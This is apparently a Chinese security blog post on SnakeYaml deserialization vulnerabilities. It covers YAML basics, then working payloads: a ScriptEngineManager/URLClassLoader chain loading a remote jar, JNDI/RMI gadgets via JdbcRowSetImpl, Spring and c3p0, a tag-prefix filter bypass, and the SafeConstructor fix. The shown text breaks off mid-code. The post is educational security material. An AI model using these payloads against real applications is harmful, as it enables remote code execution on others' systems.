@@ -1,0 +1,995 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Yaml语法 YAML大小写敏感； 使用缩进代表层级关系； 缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）  key: value      (value前有空格)   key:      child-key: value     child-key2: value2      &#x2F;&#x2F;缩进表层级关系   数组 hobby:     - java">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SnakeYaml反序列化">
+<meta property="og:url" content="https://zer0peach.github.io/2023/11/05/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="Yaml语法 YAML大小写敏感； 使用缩进代表层级关系； 缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）  key: value      (value前有空格)   key:      child-key: value     child-key2: value2      &#x2F;&#x2F;缩进表层级关系   数组 hobby:     - java">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231105230925528.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231115171115110.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231115172353434.png">
+<meta property="article:published_time" content="2023-11-05T12:54:04.000Z">
+<meta property="article:modified_time" content="2023-11-15T11:59:48.295Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231105230925528.png">
+  
+  
+  
+  <title>SnakeYaml反序列化 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SnakeYaml反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-05 20:54" pubdate>
+          2023年11月5日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          69 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SnakeYaml反序列化</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Yaml语法"><a href="#Yaml语法" class="headerlink" title="Yaml语法"></a>Yaml语法</h1><ol>
+<li>YAML大小写敏感；</li>
+<li>使用缩进代表层级关系；</li>
+<li>缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）</li>
+</ol>
+<div class="code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">key:</span> <span class="hljs-string">value</span>      <span class="hljs-string">(value前有空格)</span>
+
+
+<span class="hljs-attr">key:</span> 
+    <span class="hljs-attr">child-key:</span> <span class="hljs-string">value</span>
+    <span class="hljs-attr">child-key2:</span> <span class="hljs-string">value2</span>     
+<span class="hljs-string">//缩进表层级关系</span>
+
+
+<span class="hljs-string">数组</span>
+<span class="hljs-attr">hobby:</span>
+    <span class="hljs-bullet">-</span> <span class="hljs-string">java</span>
+    <span class="hljs-bullet">-</span> <span class="hljs-string">lol</span>
+    
+<span class="hljs-string">//常量</span>
+<span class="hljs-attr">int:</span>
+    <span class="hljs-bullet">-</span> <span class="hljs-number">123</span>
+    <span class="hljs-bullet">-</span> <span class="hljs-string">0b1010</span>
+<span class="hljs-attr">String:</span>
+    <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;hello&quot;</span></code></pre></div>
+
+<h1 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h1><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.yaml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>snakeyaml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.27<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div>
+
+<h1 id="序列化反序列化"><a href="#序列化反序列化" class="headerlink" title="序列化反序列化"></a>序列化反序列化</h1><ul>
+<li>Yaml.dump()：将一个对象转化为yaml文件形式；   &#x2F;&#x2F;序列化</li>
+<li>Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象；     &#x2F;&#x2F;反序列化</li>
+</ul>
+<div class="code-wrapper"><pre><code class="hljs pgsql">package snakeyaml;
+
+<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">User</span> &#123;
+    <span class="hljs-type">int</span> age;
+    String <span class="hljs-type">name</span>;
+    <span class="hljs-built_in">public</span> <span class="hljs-keyword">User</span>()&#123;
+        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;构造&quot;);
+    &#125;
+
+    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> setAge(<span class="hljs-type">int</span> age) &#123;
+        this.age = age;
+        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;setage&quot;);
+    &#125;
+
+    <span class="hljs-built_in">public</span> <span class="hljs-type">int</span> getAge() &#123;
+        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;getage&quot;);
+        <span class="hljs-keyword">return</span> age;
+    &#125;
+
+    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> setName(String <span class="hljs-type">name</span>) &#123;
+        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;setname&quot;);
+        this.name = <span class="hljs-type">name</span>;
+    &#125;
+
+    <span class="hljs-built_in">public</span> String getName() &#123;
+        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;getname&quot;);
+        <span class="hljs-keyword">return</span> <span class="hljs-type">name</span>;
+    &#125;
+&#125;
+
+
+package snakeyaml;
+
+<span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;
+
+<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> test &#123;
+    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;
+        serialize();
+        unserialize();
+    &#125;
+    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> serialize()&#123;
+        <span class="hljs-keyword">User</span> <span class="hljs-keyword">user</span> = <span class="hljs-built_in">new</span> <span class="hljs-keyword">User</span>();
+        <span class="hljs-keyword">user</span>.setName(&quot;zero&quot;);
+        <span class="hljs-keyword">user</span>.setAge(<span class="hljs-number">19</span>);
+        Yaml yaml = <span class="hljs-built_in">new</span> Yaml();
+        String dump = yaml.dump(<span class="hljs-keyword">user</span>);
+        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(dump);
+    &#125;
+    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> unserialize()&#123;
+        String str1 = &quot;!!snakeyaml.User &#123;age: 19, name: zero&#125;&quot;;
+        String str2 = &quot;age: 19\n&quot; +
+                &quot;name: zero&quot;;
+        Yaml yaml = <span class="hljs-built_in">new</span> Yaml();
+        yaml.<span class="hljs-keyword">load</span>(str1);
+        yaml.loadAs(str2, <span class="hljs-keyword">User</span>.<span class="hljs-keyword">class</span>);
+    &#125;
+
+&#125;
+</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs crmsh">构造
+setname
+setage
+getage
+getname
+!!snakeyaml.<span class="hljs-keyword">User</span> <span class="hljs-title">&#123;age</span>: <span class="hljs-number">19</span>, name: zero&#125;
+
+构造
+setage
+setname
+构造
+setage
+setname</code></pre></div>
+
+<p>强制类型转化<code>!!</code>相当于<code>fastjson</code>中的<code>@type</code>指定反序列化的类名</p>
+<p><strong>注意通过<code>!!</code>指定类名需要写全类名</strong></p>
+<p><code>load</code>和<code>loadAs</code>都调用了对应的setter方法，而且<code>loadAs</code>可以直接指定参数值，不用再指定类</p>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><div class="code-wrapper"><pre><code class="hljs abnf">String context <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://1q7ha5.dnslog.cn\&quot;]]]]&quot;</span><span class="hljs-comment">;</span>
+Yaml yaml <span class="hljs-operator">=</span> new Yaml()<span class="hljs-comment">;</span>
+yaml.load(context)<span class="hljs-comment">;</span></code></pre></div>
+
+<p>这个可以用来检测漏洞存在</p>
+<p>具体脚本看<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload/">github项目</a>按照作者说的</p>
+<div class="code-wrapper"><pre><code class="hljs awk">javac src<span class="hljs-regexp">/artsploit/</span>AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ .</code></pre></div>
+
+<p>要注意使用低版本jdk来编译java文件</p>
+<div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-title class_">String</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+        <span class="hljs-string">&quot;  !!java.net.URLClassLoader [[<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+        <span class="hljs-string">&quot;    !!java.net.URL [<span class="hljs-char escape_">\&quot;</span>http://127.0.0.1:8000/yaml-payload.jar<span class="hljs-char escape_">\&quot;</span>]<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+        <span class="hljs-string">&quot;  ]]<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+        <span class="hljs-string">&quot;]&quot;</span>;
+<span class="hljs-title class_">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-title class_">Yaml</span>();
+<span class="hljs-variable">yaml</span>.<span class="hljs-property">load</span>(<span class="hljs-variable">context</span>);</code></pre></div>
+
+<h1 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h1><p>SPI ，全称为 Service Provider Interface，是一种服务发现机制。它通过在ClassPath路径下的<code>META-INF/services</code>文件夹查找文件，自动加载文件里所定义的类。也就是动态为某个接口寻找服务实现。</p>
+<p>那么如果需要使用 SPI 机制需要在Java classpath 下的 <code>META-INF/services/</code> 目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的<strong>实现类</strong>。</p>
+<p><img src="/../images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231105230925528.png" srcset="/img/loading.gif" lazyload alt="image-20231105230925528"></p>
+<p>带上图应该就好理解了</p>
+<p>总的来说，<code>META-INF.services</code>下的文件名是接口类，内容为接口类的实现类</p>
+<p>程序会<code>java.util.ServiceLoder</code>动态装载实现模块，在<code>META-INF/services</code>目录下的配置文件寻找实现类的类名，通过<code>Class.forName</code>加载进来,<code>newInstance()</code>反射创建对象,并存到缓存和列表里面</p>
+<h1 id="漏洞分析就算了，自己也不懂，就跟着别人试"><a href="#漏洞分析就算了，自己也不懂，就跟着别人试" class="headerlink" title="漏洞分析就算了，自己也不懂，就跟着别人试"></a>漏洞分析就算了，自己也不懂，就跟着别人试</h1><p>有意思的是<img src="/../images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231115171115110.png" srcset="/img/loading.gif" lazyload alt="image-20231115171115110"></p>
+<p><img src="/../images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231115172353434.png" srcset="/img/loading.gif" lazyload alt="image-20231115172353434"></p>
+<p>会把<code>!!</code>变为<code>tag:yaml.org,2002:</code>然后再拼接<code>javax.script.ScriptEngineManager</code></p>
+<p>所以当<code>!!</code>被禁用时，可以用<code>tag:yaml.org,2002:</code>进行绕过</p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>加入<code>new SafeConstructor()</code>类进行过滤</p>
+<div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-keyword">import</span> <span class="hljs-variable">org</span>.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">Yaml</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-variable">org</span>.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">constructor</span>.<span class="hljs-property">SafeConstructor</span>;
+
+<span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">snaketest</span> &#123;
+    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">String</span>[] <span class="hljs-params">args</span>) &#123;
+        <span class="hljs-title class_">String</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+                <span class="hljs-string">&quot;  !!java.net.URLClassLoader [[<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+                <span class="hljs-string">&quot;    !!java.net.URL [<span class="hljs-char escape_">\&quot;</span>http://127.0.0.1:9000/yaml-payload.jar<span class="hljs-char escape_">\&quot;</span>]<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+                <span class="hljs-string">&quot;  ]]<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+                <span class="hljs-string">&quot;]&quot;</span>;
+        <span class="hljs-title class_">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-title class_">Yaml</span>(<span class="hljs-variable">new</span> <span class="hljs-title class_">SafeConstructor</span>());
+        <span class="hljs-variable">yaml</span>.<span class="hljs-property">load</span>(<span class="hljs-variable">context</span>);
+    &#125;
+
+&#125;</code></pre></div>
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>与fastjson类似，大多可以参考fastjson，但不能调用恶意类，因为fastjson调用恶意类调用的是getter</p>
+<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">Yaml</span>;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplTest</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;
+        <span class="hljs-title class_">String</span> payload = <span class="hljs-string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \&quot;rmi://127.0.0.1:1099/aa\&quot;, autoCommit: true&#125;&quot;</span>;
+        <span class="hljs-title class_">Yaml</span> yaml = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();
+        yaml.<span class="hljs-title function_">load</span>(payload);
+    &#125;
+&#125;</code></pre></div>
+
+<h2 id="Spring-PropertyPathFactoryBean利用链"><a href="#Spring-PropertyPathFactoryBean利用链" class="headerlink" title="Spring PropertyPathFactoryBean利用链"></a>Spring PropertyPathFactoryBean利用链</h2><p>这个链子需要springframework依赖</p>
+<div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-keyword">import</span> <span class="hljs-variable">org</span>.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">Yaml</span>;
+
+<span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PropertyPathFactoryBeanTest</span> &#123;
+    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">String</span>[] <span class="hljs-params">args</span>) &#123;
+        <span class="hljs-title class_">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean &#123;targetBeanName: <span class="hljs-char escape_">\&quot;</span>rmi://127.0.0.1:1099/aa<span class="hljs-char escape_">\&quot;</span>, propertyPath: <span class="hljs-char escape_">\&quot;</span>whatever<span class="hljs-char escape_">\&quot;</span>, beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory &#123;shareableResources: [<span class="hljs-char escape_">\&quot;</span>rmi://127.0.0.1:1099/aa<span class="hljs-char escape_">\&quot;</span>]&#125;&#125;&quot;</span>;
+        <span class="hljs-title class_">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-title class_">Yaml</span>();
+        <span class="hljs-variable">yaml</span>.<span class="hljs-property">load</span>(<span class="hljs-variable">payload</span>);
+    &#125;
+&#125;</code></pre></div>
+
+<h2 id="c3p0"><a href="#c3p0" class="headerlink" title="c3p0"></a>c3p0</h2><h3 id="二次反序列化-Hex"><a href="#二次反序列化-Hex" class="headerlink" title="二次反序列化 Hex"></a>二次反序列化 Hex</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> snakeyaml;
+
+<span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;
+
+<span class="hljs-keyword">import</span> java.io.FileInputStream;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.InputStream;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">yaml_with_c3p0</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;
+    
+        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;D:\\CTF-tool\\java_unserialize\\calc.ser&quot;</span>);
+        <span class="hljs-type">byte</span>[] data = toByteArray(in);
+        in.close();
+        <span class="hljs-type">String</span> <span class="hljs-variable">HexString</span> <span class="hljs-operator">=</span> bytesToHexString(data, data.length);
+        System.out.println(HexString);
+
+
+        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();
+        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +
+                <span class="hljs-string">&quot;userOverridesAsString: HexAsciiSerializedMap:&quot;</span> + HexString + <span class="hljs-string">&#x27;;&#x27;</span>;
+        yaml.load(str);
+
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toByteArray(InputStream in) <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">byte</span>[] classBytes;
+        classBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[in.available()];
+        in.read(classBytes);
+        in.close();
+        <span class="hljs-keyword">return</span> classBytes;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bArray, <span class="hljs-type">int</span> length)</span> &#123;
+        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(length);
+
+        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;
+            <span class="hljs-type">String</span> <span class="hljs-variable">sTemp</span> <span class="hljs-operator">=</span> Integer.toHexString(<span class="hljs-number">255</span> &amp; bArray[i]);
+            <span class="hljs-keyword">if</span> (sTemp.length() &lt; <span class="hljs-number">2</span>) &#123;
+                sb.append(<span class="hljs-number">0</span>);
+            &#125;
+
+            sb.append(sTemp.toUpperCase());
+        &#125;
+        <span class="hljs-keyword">return</span> sb.toString();
+    &#125;
+&#125;
+</code></pre></div>
+
+<h3 id="jndi注入"><a href="#jndi注入" class="headerlink" title="jndi注入"></a>jndi注入</h3><div class="code-wrapper"><pre><code class="hljs processing"><span class="hljs-keyword">package</span> snakeyaml;
+
+<span class="hljs-keyword">import</span> org.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">Yaml</span>;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">snakewithjndi</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-built_in">String</span>[] args) <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot;</span> +
+                <span class="hljs-string">&quot;jndiName: rmi://127.0.0.1:1099/exp2\n&quot;</span> +
+                <span class="hljs-string">&quot;loginTimeout: 0&quot;</span>;
+        Yaml yaml = <span class="hljs-keyword">new </span><span class="hljs-class title_">Yaml</span>();
+        yaml.<span class="hljs-property">load</span>(<span class="hljs-built_in">str</span>);
+    &#125;
+&#125;</code></pre></div>
+
+<h2 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p>在fastjson1.2.68当中，存在一个任意文件写入的反序列化漏洞，并没有依赖fastjson的一些类，这些都是java自带的，那SnakeYaml也是可以用到的</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> yaml-payload.jar | openssl zlib | <span class="hljs-built_in">base64</span> -w 0</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//直接生成</span>
+<span class="hljs-keyword">package</span> Snake;
+
+<span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;
+
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;
+<span class="hljs-keyword">import</span> java.util.Base64;
